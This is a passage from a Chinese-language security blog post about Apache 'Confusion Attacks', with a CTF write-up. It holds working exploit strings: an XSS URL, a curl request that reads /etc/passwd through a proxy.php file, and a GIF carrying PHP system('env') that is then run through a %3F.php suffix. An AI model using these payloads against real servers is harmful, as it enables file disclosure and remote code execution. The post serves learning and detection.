<p>如果伺服器同時安裝 Nginx 或 Jetty，因為這些服務預設的 Web Root 在 <code>/usr/share</code> 下，因此就能夠取得這些服務的敏感資訊，例如 Jetty 上的 <code>web.xml</code> 設定等：</p>
<ul>
<li><code>/usr/share/nginx/html/</code></li>
<li><code>/usr/share/jetty9/etc/</code></li>
<li><code>/usr/share/jetty9/webapps/</code></li>
</ul>
<p>以下為透過存取 <code>Davical</code> 套件中 <code>setup.php</code> 唯讀複本，洩漏 <code>phpinfo()</code> 內容的範例：</p>
<p><img src="/posts/2025-Apache-Confusion-Attacks/image3.webp" alt="alt"></p>
<p>Source: <a target="_blank" rel="noopener" href="https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/">https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/</a></p>
<h5 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2. XSS"></a>2. XSS</h5><p>在 Ubuntu Desktop 中，預設安裝了開源的辦公軟體 LibreOffice。可利用其中的檔案來執行 XSS。</p>
<p><strong>Path: /usr/share/libreoffice/help/help.html</strong></p>
<pre><code class="hljs apacheconf"><span class="hljs-attribute">var</span> url = window.location.href;
<span class="hljs-attribute">var</span> n = url.indexOf('?');
<span class="hljs-attribute">if</span> (n != -<span class="hljs-number">1</span>) {
    // <span class="hljs-attribute">the</span> URL came from LibreOffice help (F1)
    <span class="hljs-attribute">var</span> version = getParameterByName(<span class="hljs-string">"Version"</span>, url);
    <span class="hljs-attribute">var</span> query = url.substr(n + <span class="hljs-number">1</span>, url.length);
    <span class="hljs-attribute">var</span> newURL = version + '/index.html?' + query;
    <span class="hljs-attribute">window</span>.location.replace(newURL);
} <span class="hljs-attribute">else</span> {
    <span class="hljs-attribute">window</span>.location.replace('latest/index.html');
}</code></pre>

<p>可以透過不安全的 <code>RewriteRule</code> 達成 XSS 攻擊：</p>
<pre><code class="hljs url">http://server/html/usr/share/libreoffice/help/help.html%3F?Version=javascript:alert(1)//</code></pre>

<p><img src="/posts/2025-Apache-Confusion-Attacks/image4.webp" alt="alt"></p>
<p>Source: <a target="_blank" rel="noopener" href="https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/">https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/</a></p>
<h5 id="3-LFI"><a href="#3-LFI" class="headerlink" title="3. LFI"></a>3. LFI</h5><p>如果伺服器安裝了一些套件，例如 JpGraph、jQuery-jFeed、WordPress 或 Moodle 外掛等，他們自帶的一些工具或文件也可以作為利用的對象，包含：</p>
<ul>
<li><code>/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php</code></li>
<li><code>/usr/share/javascript/jquery-jfeed/proxy.php</code></li>
<li><code>/usr/share/moodle/mod/assignment/type/wims/getcsv.php</code></li>
</ul>
<p>以下為透過 jQuery-jFeed 中 <code>proxy.php</code> 檔讀取任意檔案的請求範例：</p>
<pre><code class="hljs bash">$ curl http://server/html/usr/sharejavascript/jquery-jfeed/proxy.php%3F?url=/etc/passwd&amp;foo
<span class="hljs-comment"># the content of /etc/passwd</span></code></pre>

<h5 id="4-SSRF"><a href="#4-SSRF" class="headerlink" title="4. SSRF"></a>4. SSRF</h5><p>除此之外，也可以透過以下檔案進行 SSRF：</p>
<ul>
<li><code>/usr/share/php/magpierss/scripts/magpie_debug.php</code></li>
</ul>
<h2 id="參、深入學習"><a href="#參、深入學習" class="headerlink" title="參、深入學習"></a>參、深入學習</h2><h3 id="一、CTF-練習"><a href="#一、CTF-練習" class="headerlink" title="一、CTF 練習"></a>一、CTF 練習</h3><p>為了達到自己嘗試實作的目的，我找到了在 STDiO24CTF 中的題目 <a target="_blank" rel="noopener" href="https://drive.google.com/uc?id=1Ja7va0_gm2FDCf0ueVGKCIcff53Qoaew">01_Confusion</a>，並成功取得 Flag，Writeup 如下：</p>
<p><strong>STDiO24CTF 01_Confusion Writeup</strong></p>
<ol>
<li>偵查：此網站提供了一個上傳檔案的功能，雖然有限制只能上傳 jpg、png、gif 或 bmp 格式的檔案，但不會利用檔案內容作為判斷依據。</li>
<li>偵查：在 <code>default-site.conf</code> 中，使用了不安全的 <code>RewriteRule</code>，因此可存取 DocumentRoot 以外的其他路徑。並且在存取上傳的 Exploit 時，需要在結尾加上 <code>%3F.php</code>，使其以 PHP 進行解析執行。<br> <img src="/posts/2025-Apache-Confusion-Attacks/image5.webp" alt="alt"></li>
<li>武裝：製作帶有惡意 PHP 程式碼的 Exploit 圖片。 <pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">"&lt;?php echo system('env'); ?&gt;"</span> &gt; exploit.gif</code></pre></li>
<li>傳遞：上傳 Exploit 並得到上傳後的檔名為 <code>Meme-688656d968aa36.47347853.gif</code>。<br> <img src="/posts/2025-Apache-Confusion-Attacks/image6.webp" alt="alt"></li>
<li>攻擊：依據原始碼 <code>index.php</code>，檔案會被上傳到路徑 <code>/var/www/uploads/</code> 中。因此存取路徑 <code>http://localhost:1337/var/www/uploads/Meme-688656d968aa36.47347853.gif%3F.php</code> 得到 Flag。<br> <img src="/posts/2025-Apache-Confusion-Attacks/image7.webp" alt="alt"></li>
</ol>
<h3 id="二、專案"><a href="#二、專案" class="headerlink" title="二、專案"></a>二、專案</h3><p>隨著漏洞的公開，未來將有機會出現許多類似的 CTF 題型。因此我製作了檢測工具及 AI Prompt。請見：<a target="_blank" rel="noopener" href="https://github.com/1PingSun/Apache-Confusion-Attacks-Detector">https://github.com/1PingSun/Apache-Confusion-Attacks-Detector</a>。</p>
<h2 id="肆、參考資料"><a href="#肆、參考資料" class="headerlink" title="肆、參考資料"></a>肆、參考資料</h2><ol>
<li>Black Hat（2025 年 1 月 30 日）。Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!。YouTube。<a target="_blank" rel="noopener" href="https://youtu.be/euO9WbYHm0s">https://youtu.be/euO9WbYHm0s</a></li>
<li>Orange Tsai（2024 年 8 月 9 日）。Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!。Orange Tsai。<a target="_blank" rel="noopener" href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">https://blog.orange.tw/posts/2024-08-confusion-attacks-en/</a></li>
</ol>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2025/08/08/2025-COSCUP/" title="COSCUP 2025 心得"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: COSCUP 2025 心得</span></a><a class="button is-default" href="/2025/07/28/2025-WCD/" title="網頁快取利用之技術分析"><span class="has-text-weight-semibold">Next: 網頁快取利用之技術分析</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="1PingSun/1PingSun.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/1PingSun"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><!-- Telegram--><a title="telegram" target="_blank" rel="noopener nofollow" href="//t.me/sunyiping"><i class="fab fa-telegram-plane"></i></a><!-- Signal--></section><p><span>Copyright ©</span><span> 1Ping 2025</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>